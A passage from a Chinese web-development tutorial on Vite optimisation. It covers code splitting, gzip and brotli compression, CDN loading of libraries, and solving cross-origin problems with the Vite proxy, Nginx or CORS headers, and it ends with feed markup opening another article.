<p>代码分割后，会优先加载「首屏必需的代码」（比如首页渲染、登录逻辑），非必需的代码（比如详情页、设置页、大型组件）延迟加载（按需加载）。</p>
<ul>
<li>利用浏览器缓存，减少用户重复下载</li>
</ul>
<p>把稳定不变的代码（第三方依赖、公共组件）拆成独立 chunk（比如<code>vendors~main.js</code>），这些 chunk 的文件名通常会带哈希（如<code>vendors~main.123abc.js</code>）。</p>
<p>用户第一次访问时下载这些 chunk，之后只要依赖 / 公共组件不更新，哈希值不变，浏览器会直接用缓存的文件，不用重新下载。
后续你修改业务代码时，只有 “业务 chunk” 的哈希变化，用户只需下载这个小体积的更新文件，而非整个大 bundle——<strong>更新迭代时的用户下载成本大幅降低</strong>。</p>
<h5 data-id="heading-63">build.rollupOptions.output.manualChunks</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-attr">build</span>: {
    <span class="hljs-attr">rollupOptions</span>: {
        <span class="hljs-attr">output</span>: {
            <span class="hljs-comment">// 第一种接收一个对象</span>
            <span class="hljs-comment">// manualChunks: {</span>
            <span class="hljs-comment">// // rollup会将node_modules下的vue、axios...等数组中有的库打包到vendor开头的文件中</span>
            <span class="hljs-comment">//     vendor: ['vue', 'axios', ...],</span>
            <span class="hljs-comment">// }</span>
            <span class="hljs-comment">// 第二种接收一个函数</span>
            <span class="hljs-attr">manualChunks</span>: <span class="hljs-function"><span class="hljs-params">id</span> =&gt;</span> {
                <span class="hljs-comment">// 将node_modules下的文件全部打包到vendor开头的文件中</span>
                <span class="hljs-keyword">if</span> (id.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'node_modules'</span>)) {
                    <span class="hljs-keyword">return</span> <span class="hljs-string">'vendor'</span>
                }
            }
        }
    }
}
</code></pre>
<h5 data-id="heading-64">示例：</h5>
<p>例如，没有配置前运行<code>pnpm build命令</code>，查看控制台输出</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63734d1e05484eab8b6f785b0c021fd0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=Wws375lEKgGKNe8FQj6DbY9wvYE%3D" alt="" loading="lazy"/></p>
<p>可以看到所有代码（包括第三方库、自己写的代码）都被打包为了<code>index-Bhk5f-Te.js</code>，在<code>main.js</code>中添加一行代码，如<code>console.log(111)</code>,重新运行<code>pnpm build</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0602689f6ede4c56ada640246b6a02dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=BdV8Az4kd475tgxCXYZYCFNYXlY%3D" alt="" loading="lazy"/></p>
<p>可以看到我们仅仅修改了一小段代码，而在生产打包时，却是将所有代码都打包了，重新生成了新的hash值，这样每次修改代码，都要全量打包是非常消耗性能的，一是没法利用浏览器缓存机制来减少请求体积，二是每次更新的体积较大（因为不是只更新代码修改部分）。</p>
<p>下面我们来看看添加了配置项的情况：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-attr">manualChunks</span>: <span class="hljs-function"><span class="hljs-params">id</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> ( id.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'node_modules'</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">'vendor'</span>
    }
}
</code></pre>
<p>运行<code>pnpm build</code>命令，查看控制台：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7c342b777c04d59bc425a2492e71651~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=vXTpfDlC3H02fAvJ2F3kAfDL0%2FQ%3D" alt="" loading="lazy"/></p>
<p>可以看到原先的代码文件被打包成了两个，并且<code>node_modules</code>下的文件被打包为了<code>vendor-</code>开头的文件。然后我们再次修改<code>main.js</code>中的代码，重新打包得到如下结果：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e269cfda50854e1fa1045fc502a300c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=v1nXy1FAsJcx6hG6MqlUelUZT3c%3D" alt="" loading="lazy"/>
这次打包我们可以观察到，Vite在打包时仅仅对<code>index-</code>开头的文件进行了重新打包，对于<code>vendor-</code>开头的文件而是利用缓存，不进行重新打包，并且我们可以看到，重新打包的那部分代码体积是远小于没有变动的那部分体积的。</p>
<h4 data-id="heading-65">gzip压缩</h4>
<p><strong>引言：</strong></p>
<p>在 Vite 中，<strong>gzip 压缩</strong>是前端性能优化的关键手段之一——核心作用是<strong>减小静态资源（JS/CSS/ 图片等）的传输体积</strong>，从而提升首屏加载速度、降低服务器带宽成本，尤其对大体积 JS bundle 或弱网环境效果显著。</p>
<h5 data-id="heading-66">原理：</h5>
<p>gzip 是一种<strong>无损数据压缩算法</strong>（压缩后能完全还原原始内容），其核心逻辑是：</p>
<ol>
<li>识别文件中重复出现的字符串 / 数据，用「索引 + 标记」替代重复内容（比如 JS 中大量重复的变量名、函数体、注释）；</li>
<li>压缩后的文件后缀通常为 <code>.gz</code>（如 <code>main.js.gz</code>、<code>index.css.gz</code>）；</li>
<li>浏览器请求资源时，会在 HTTP 请求头中携带 <code>Accept-Encoding: gzip, deflate</code>（表示支持 gzip 压缩）；</li>
<li>服务器收到请求后，若存在对应的 <code>.gz</code> 压缩文件，会返回压缩文件，并在响应头中添加 <code>Content-Encoding: gzip</code>；</li>
<li>浏览器收到压缩文件后，自动解压并执行 / 渲染。</li>
</ol>
<h5 data-id="heading-67"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnonzzz%2Fvite-plugin-compression" target="_blank" title="https://github.com/nonzzz/vite-plugin-compression" ref="nofollow noopener noreferrer">vite-plugin-compression2</a></h5>
<p>Viteb本身没有内置gzip压缩的功能，所以需要借助<code>vite-plugin-compression2</code>这个插件来实现</p>
<pre><code class="hljs language-powershell" lang="powershell">pnpm add vite-plugin-compression2 -D
</code></pre>
<p><strong>基本使用方式：</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> { compression } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-compression2'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-comment">// ...其他插件</span>
    <span class="hljs-title function_">compression</span>()
  ]
})
</code></pre>
<p><strong>常见配置项</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> compression <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-compression2'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-comment">// 1. gzip 压缩（兼容老浏览器，优先级低）</span>
    <span class="hljs-title function_">compression</span>({
      <span class="hljs-attr">algorithm</span>: <span class="hljs-string">'gzip'</span>, <span class="hljs-comment">// 压缩算法</span>
      <span class="hljs-attr">ext</span>: <span class="hljs-string">'.gz'</span>, <span class="hljs-comment">// 压缩文件后缀</span>
      <span class="hljs-attr">threshold</span>: <span class="hljs-number">1024</span>, <span class="hljs-comment">// 1KB 以上才压缩（小文件没必要）</span>
      <span class="hljs-attr">deleteOriginFile</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 不删除原始文件（兼容不支持压缩的浏览器）</span>
      <span class="hljs-attr">include</span>: <span class="hljs-regexp">/\.(js|css|html|svg|json|txt)$/</span>, <span class="hljs-comment">// 只压缩文本类资源</span>
      <span class="hljs-attr">exclude</span>: <span class="hljs-regexp">/\.(png|jpg|jpeg|webp|mp4|woff2)$/</span>, <span class="hljs-comment">// 排除已压缩的资源（图片/视频/字体）</span>
      <span class="hljs-attr">compressionOptions</span>: { <span class="hljs-attr">level</span>: <span class="hljs-number">6</span> }, <span class="hljs-comment">// 压缩等级（0-9，6 是平衡值）</span>
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'[path][base].gz'</span>, <span class="hljs-comment">// 压缩文件命名格式（默认即可）</span>
    }),
    <span class="hljs-comment">// 2. brotli 压缩（现代浏览器优先，压缩率更高）</span>
    <span class="hljs-title function_">compression</span>({
      <span class="hljs-attr">algorithm</span>: <span class="hljs-string">'brotliCompress'</span>,
      <span class="hljs-attr">ext</span>: <span class="hljs-string">'.br'</span>,
      <span class="hljs-attr">threshold</span>: <span class="hljs-number">1024</span>,
      <span class="hljs-attr">deleteOriginFile</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">include</span>: <span class="hljs-regexp">/\.(js|css|html|svg|json|txt)$/</span>,
      <span class="hljs-attr">exclude</span>: <span class="hljs-regexp">/\.(png|jpg|jpeg|webp|mp4|woff2)$/</span>,
      <span class="hljs-attr">compressionOptions</span>: { <span class="hljs-attr">level</span>: <span class="hljs-number">11</span> }, <span class="hljs-comment">// brotli 最高等级 11，压缩率最优</span>
    }),
  ],
});
</code></pre>
<p><strong>使用注意</strong></p>
<ol>
<li>服务器 / CDN 需配置：支持根据 <code>Accept-Encoding</code> 请求头，返回对应的 <code>.gz</code>/<code>.br</code> 压缩文件（否则压缩产物白生成），并且如果CDN支持自动压缩，可以关闭压缩插件；</li>
<li>避免对无效压缩（如对<code>png、jpg、woff</code>等非文本类文件进行压缩，配置<code>exclude</code>避开），否则会浪费构建时间和存储空间。</li>
<li>小体积不要使用gzip压缩，因为浏览器解压也会消耗时间，所以对于小体积文件要避免进行压缩。</li>
<li>浏览器兼容：gzip 适配所有浏览器（含老版），brotli 覆盖 95%+ 现代浏览器，zstd 仅适合新版浏览器；</li>
<li>构建正常：<code>vite build</code> 能生成完整 <code>dist</code> 目录（无语法 / 依赖错误）。</li>
</ol>
<h5 data-id="heading-68">示例：</h5>
<p>正常运行构建命令<code>pnpm build</code>，我们其实可以看到控制台中的输出信息中给出了压缩前后的对比</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f86e91bec7bd430cb577ca3bb292f4e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=u8f%2BO0GDzvj7GW%2Fy0nVLgHQN%2Bwg%3D" alt="" loading="lazy"/></p>
<p>红色部分是压缩前的体积，蓝色部分呢是采用gzip压缩后的体积。安装插件并使用：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37de229f42c844feb0214896e2b70111~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=1Kia1JKJmvHxHXmcNNQgFYhbxKY%3D" alt="" loading="lazy"/></p>
<p>可以看到压缩后的结果。</p>
<h4 data-id="heading-69">CDN优化</h4>
<p>CDN 全称 <strong>Content Delivery Network</strong>，即<strong>内容分发网络</strong>，是一种经策略性部署的分布式网络架构，核心是通过在全球或区域内广泛部署边缘服务器节点，将源站的内容缓存到离用户最近的节点，让用户就近获取资源，以此解决网络带宽小、用户分布不均等导致的访问慢问题。</p>
<p><strong>引入</strong>：</p>
<p>在项目开发中，我们常会引入 Vue、axios、Lodash 等第三方库。默认打包流程中，这些库会被合并到生产环境的业务代码 bundle 中，最终由用户从业务服务器加载完整资源包。</p>
<p>假设有这样的场景：我们的业务服务器 B 部署在中国成都，而用户 A 位于美国纽约。当用户 A 访问网站时，所有资源（包括第三方库代码）都需要从成都的服务器 B 跨洋传输。由于地理距离遥远，网络链路长、延迟高，资源加载耗时久，可能出现页面白屏、交互卡顿等问题，严重影响用户体验。</p>
<p>这正是 CDN（内容分发网络）的核心优化场景 —— 我们无需自行在纽约部署服务器，而是可以借助成熟的公共 CDN 服务：将 Vue、axios 等通用性强的第三方库，托管到全球分布式的 CDN 节点（包括纽约附近的边缘节点）。当用户 A 访问网站时，会通过 CDN 的智能路由机制，自动从距离最近的纽约边缘节点加载这些第三方库资源，无需跨洋请求成都的服务器 B。</p>
<p>这样一来，第三方库的加载距离大幅缩短，网络延迟和传输耗时显著降低，配合业务代码的合理优化（如代码分割、本地缓存），用户 A 能更快地完成页面资源加载与渲染，网站访问速度和体验得到明显提升。</p>
<h5 data-id="heading-70"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnonzzz%2Fvite-plugin-cdn" target="_blank" title="https://github.com/nonzzz/vite-plugin-cdn" ref="nofollow noopener noreferrer">vite-plugin-cdn2</a></h5>
<pre><code class="hljs language-powershell" lang="powershell"> pnpm add vite-plugin-cdn2 -D
</code></pre>
<p><strong>配置示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-vue'</span>;
<span class="hljs-keyword">import</span> cdn2 <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-cdn2'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">vue</span>(),
    <span class="hljs-title function_">cdn2</span>({
      <span class="hljs-comment">// 新增全局配置（统一控制启用状态、CDN 源等）</span>
      <span class="hljs-attr">options</span>: {
        <span class="hljs-attr">enabled</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'production'</span>,
        <span class="hljs-attr">defaultCDN</span>: <span class="hljs-string">'jsdelivr'</span>,
        <span class="hljs-attr">autoComplete</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 自动补全 path 和 var，无需手动写</span>
      },
      <span class="hljs-attr">modules</span>: [
        { <span class="hljs-attr">name</span>: <span class="hljs-string">'vue'</span> }, <span class="hljs-comment">// 仅需写 name，其余自动识别</span>
        { <span class="hljs-attr">name</span>: <span class="hljs-string">'axios'</span> },
      ],
    }),
  ]
})
</code></pre>
<hr/>
<h3 data-id="heading-71">跨域</h3>
<p>产生跨域的原因是由于浏览器的<strong>同源策略</strong>，不符合同源策略条件就会产生跨域。</p>
<h4 data-id="heading-72">同源策略</h4>
<p><strong>协议、域名（含子域名）、端口三者必须完全一致</strong>，只要有一个不同，就是跨域：</p>








































<table><thead><tr><th>对比项</th><th>示例（当前页面：<code>https://a.com:443</code>）</th><th>是否跨域？</th></tr></thead><tbody><tr><td>协议不同</td><td><code>http://a.com</code>（http vs https）</td><td>是</td></tr><tr><td>域名不同</td><td><code>https://b.com</code>（a vs b）</td><td>是</td></tr><tr><td>子域名不同</td><td><code>https://api.a.com</code>（主域 vs 子域）</td><td>是</td></tr><tr><td>端口不同</td><td><code>https://a.com:8080</code>（443 vs 8080）</td><td>是</td></tr><tr><td>仅路径不同</td><td><code>https://a.com/user</code>（路径不同）</td><td>否（同源）</td></tr><tr><td>仅查询参数不同</td><td><code>https://a.com?name=test</code>（参数不同）</td><td>否（同源）</td></tr></tbody></table>
<p>⚠️ 注意：「跨域」仅存在于<strong>浏览器端</strong>（浏览器的安全限制），服务端之间的请求（如 Node.js 调用接口、Nginx 反向代理）完全没有跨域问题 —— 这也是 代理方案 能解决跨域的核心原理。</p>
<p><strong>例如</strong>：</p>
<p>直接请求百度</p>
<pre><code class="hljs language-js" lang="js">axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'http://www.baidu.com'</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)
})
</code></pre>
<p>浏览器报错</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58ad4070f2704e9d8613b51f031b26bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=h%2FhHGOAw3IOG0Gepydk9p9oClHs%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-73">开发环境：Proxy 代理</h4>
<p>通过「中间服务器转发请求」，绕开浏览器同源策略。</p>
<h5 data-id="heading-74">1. 核心配置（vite.config.js）</h5>
<p>假设前端项目地址：<code>http://localhost:5173</code>（Vite 默认端口），后端接口地址：<code>https://api.b.com</code>（跨域），配置如下：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">server</span>: {
    <span class="hljs-attr">proxy</span>: {
      <span class="hljs-comment">// 1. 基础代理：匹配所有以 /api 开头的请求</span>
      <span class="hljs-string">'/api'</span>: {
        <span class="hljs-attr">target</span>: <span class="hljs-string">'https://www.baidu.com'</span>, <span class="hljs-comment">// 后端接口根地址</span>
        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 关键：让后端认为请求来自代理服务器（而非浏览器），避免后端校验 Origin 失败</span>
        <span class="hljs-attr">rewrite</span>: <span class="hljs-function">(<span class="hljs-params">path</span>) =&gt;</span> path.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^\/api/</span>, <span class="hljs-string">''</span>), <span class="hljs-comment">// 可选：重写路径（如前端 /api/user → 后端 /user）</span>
        <span class="hljs-comment">// 可选：处理 HTTPS 接口（若后端是 HTTPS，需配置）</span>
        <span class="hljs-attr">secure</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 忽略 SSL 证书校验（开发环境可用，生产环境需开启 true）</span>
        <span class="hljs-attr">headers</span>: {
          <span class="hljs-comment">// 可选：添加自定义请求头（如授权、版本号）</span>
          <span class="hljs-string">'X-Proxy'</span>: <span class="hljs-string">'Vite-Proxy'</span>,
        },
      },
    },
  },
});
</code></pre>
<h5 data-id="heading-75">2. 前端请求示例</h5>
<pre><code class="hljs language-javascript" lang="javascript">axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api'</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)
})
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4d0d74ca9c34409b887fce6e9a9fa80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=5pWUZW6TydujCWU9k9BdENPnmK8%3D" alt="" loading="lazy"/></p>
<p>请求成功并且控制台没有报错信息：</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6dfb1a6f00824574aac3aec9c5008ecf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=I829PtWxBD7JLBBp4IgvTjHA%2FgU%3D" loading="lazy"/>
<h5 data-id="heading-76">3. 注意</h5>
<ul>
<li>「后端报 Origin 不允许」：必开 <code>changeOrigin: true</code>（让代理服务器转发时，将 Origin 改为 <code>target</code> 地址，而非前端 <code>localhost:5173</code>）；</li>
<li>「HTTPS 接口请求失败」：开发环境配置 <code>secure: false</code>（忽略证书校验），生产环境需确保后端 SSL 证书有效，再改为 <code>true</code>；</li>
<li>「路径匹配错误」：若后端接口没有统一前缀（如直接是 <code>https://api.b.com/user</code>），前端无需加 <code>/api</code>，直接匹配 <code>'/'</code>（但不推荐，可能冲突）；</li>
<li>「代理不生效」：检查 Vite 是否重启（修改 proxy 后需重启 Vite），或请求路径是否匹配代理规则（如 <code>/api/user</code> 才会触发 <code>/api</code> 代理）。</li>
</ul>
<h4 data-id="heading-77">生产环境：2 种核心方案（Nginx 代理 vs CORS 跨域头）</h4>
<p>生产环境没有 Vite 代理，需通过<strong>服务端代理</strong>或<strong>CORS 跨域头</strong>解决，两者各有适用场景：</p>
<h5 data-id="heading-78">方案 1：Nginx 反向代理（推荐，适合前后端分离部署）</h5>
<p>原理和 Vite Proxy 一致：通过 Nginx 转发前端请求到后端，绕开浏览器跨域限制 ——<strong>优势是前端无需任何修改，跨域逻辑完全由服务端管控</strong>。</p>
<ul>
<li>前后端分离部署（前端 Nginx 托管，后端独立部署）；</li>
<li>后端不允许直接对外暴露（需通过 Nginx 做权限控制、限流）；</li>
<li>需隐藏后端真实地址（提高安全性）。</li>
</ul>
<h5 data-id="heading-79">方案 2：后端配置 CORS 跨域头（简单直接，适合后端可修改）</h5>
<p>你的理解很准：通过后端返回 <code>Access-Control-Allow-*</code> 系列头，告诉浏览器「允许该源的跨域请求」——<strong>优势是无需配置 Nginx，后端单独搞定</strong>。</p>
<p><strong>核心 CORS 响应头（后端需返回）</strong></p>



































<table><thead><tr><th>响应头</th><th>作用说明</th><th>示例值</th></tr></thead><tbody><tr><td><code>Access-Control-Allow-Origin</code></td><td>允许跨域的源（必填）：<code>*</code> 表示所有源（不推荐，有安全风险），指定域名更安全</td><td><code>https://a.com</code>（仅允许 <a href="https://link.juejin.cn?target=https%3A%2F%2Fa.com%2F" target="_blank" title="https://a.com/" ref="nofollow noopener noreferrer">a.com</a>）</td></tr><tr><td><code>Access-Control-Allow-Methods</code></td><td>允许的请求方法（必填）</td><td><code>GET,POST,PUT,DELETE,OPTIONS</code></td></tr><tr><td><code>Access-Control-Allow-Headers</code></td><td>允许的自定义请求头（如 Token、Content-Type）</td><td><code>Authorization,Content-Type</code></td></tr><tr><td><code>Access-Control-Allow-Credentials</code></td><td>是否允许携带 Cookie（可选）：true 表示允许（此时 Origin 不能为 *）</td><td><code>true</code></td></tr><tr><td><code>Access-Control-Max-Age</code></td><td>预检请求（OPTIONS）的缓存时间（可选）：减少 OPTIONS 请求次数</td><td><code>86400</code>（24 小时）</td></tr></tbody></table>
<p><strong>前端请求示例（需携带 Cookie 时）</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'https://api.b.com/user'</span>, {
  <span class="hljs-attr">withCredentials</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 关键：允许携带 Cookie（需和后端 Access-Control-Allow-Credentials: true 配合）</span>
});
</code></pre>
<p><strong>适用场景：</strong></p>
<ul>
<li>后端可直接对外暴露（如公开 API）；</li>
<li>前后端部署在不同域名，且不想配置 Nginx；</li>
<li>需携带 Cookie 进行身份验证（如单点登录）。</li>
</ul>
<p><strong>安全注意：</strong></p>
<ul>
<li>禁止用 <code>Access-Control-Allow-Origin: *</code>（允许所有源跨域，有 CSRF 风险），必须指定具体域名；</li>
<li>若允许携带 Cookie，<code>Access-Control-Allow-Origin</code> 不能为 <code>*</code>，且需配置 <code>Access-Control-Allow-Credentials: true</code>；</li>
<li>限制 <code>Access-Control-Allow-Methods</code> 和 <code>Access-Control-Allow-Headers</code> 为必需值，避免过度开放。</li>
</ul>
<h4 data-id="heading-80">其他跨域方案（特殊场景补充）</h4>
<p>除了上面的核心方案，还有 2 种特殊场景的跨域方法，作为补充：</p>
<h5 data-id="heading-81">1. JSONP（仅支持 GET 请求，几乎淘汰）</h5>
<p>原理：利用 <code>&lt;script&gt;</code> 标签不受同源策略限制的特性，通过动态创建 <code>&lt;script&gt;</code> 标签请求接口，后端返回回调函数包裹的 JSON 数据。</p>
<ul>
<li>缺点：仅支持 GET 方法、安全性差（可能注入恶意代码）、无法携带 Cookie；</li>
<li>适用场景：极老的后端系统（不支持 CORS 和代理），现在几乎不用。</li>
</ul>
<h5 data-id="heading-82">2. document.domain + iframe（仅适合同主域不同子域）</h5>
<p>原理：若前端是 <code>a.com</code>，iframe 是 <code>api.a.com</code>（同主域不同子域），可通过 <code>document.domain = 'a.com'</code> 让两者同源，实现跨域通信。</p>
<ul>
<li>缺点：仅适合同主域、需操作 iframe，灵活性差；</li>
<li>适用场景：老项目的 iframe 通信，现在很少用。</li>
</ul>
<h4 data-id="heading-83">常见误区（必看，避免踩坑）</h4>
<ol>
<li><strong>前端配置 CORS 头就能解决跨域</strong>：错！CORS 是后端返回的响应头，前端配置无效（浏览器只认后端返回的头）；</li>
<li><strong>生产环境用 Vite Proxy</strong>：错！Vite Proxy 仅用于开发环境，生产环境需用 Nginx 代理或 CORS；</li>
<li><strong>Access-Control-Allow-Origin: * 万能</strong>：错！有安全风险，且不支持携带 Cookie；</li>
<li><strong>跨域请求不会发送</strong>：错！跨域请求会发送，浏览器会在「收到响应后」检查 CORS 头，若不允许则拦截响应（而非阻止请求发送）；</li>
<li><strong>OPTIONS 请求是多余的</strong>：错！非简单请求（如 POST 带 JSON 数据、自定义头）会先发送 OPTIONS 预检请求，确认后端允许后再发送真实请求。</li>
</ol>
<h4 data-id="heading-84">总结</h4>
<p>跨域的核心是「浏览器同源策略限制」，解决方案的本质是「绕开或告知浏览器允许跨域」：</p>
<ul>
<li>开发环境：优先用 Vite Proxy（配置简单，无需后端配合）；</li>
<li>生产环境：优先用 Nginx 代理（前端无感知，安全性高）或 CORS 跨域头（后端单独搞定）；</li>
<li>避坑关键：分清环境、不滥用 <code>*</code>、理解 CORS 头的作用方（后端）。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Oh-My-OpenCode：打造最强 AI 编程助手配置实战指南]]></title>    <link>https://juejin.cn/post/7602177588442873875</link>    <guid>https://juejin.cn/post/7602177588442873875</guid>    <pubDate>2026-02-03T04:02:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602177588442873875" data-draft-id="7602201748229341203" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Oh-My-OpenCode：打造最强 AI 编程助手配置实战指南"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-02-03T04:02:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小碗细面"/> <meta itemprop="url" content="https://juejin.cn/user/1618104611770958"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Oh-My-OpenCode：打造最强 AI 编程助手配置实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1618104611770958/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小碗细面
  </span> <!----> <!----> <div class="vip-level" data-v-cd7d0a50="" data-v-292f6e48=""><span class="tooltip" data-v-cd7d0a50=""><div class="byte-tooltip byte-tooltip--dark" style="display:none;">
        VIP.5 如鱼得水
      </div><span class="byte-tooltip__wrapper"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="VIP.5 如鱼得水" title="VIP.5 如鱼得水" class="lazy" style="aspect-ratio:NaN;" data-v-5244ef91="" data-v-cd7d0a50=""/></span></span></div> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:02:14.000Z" title="Tue Feb 03 2026 04:02:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
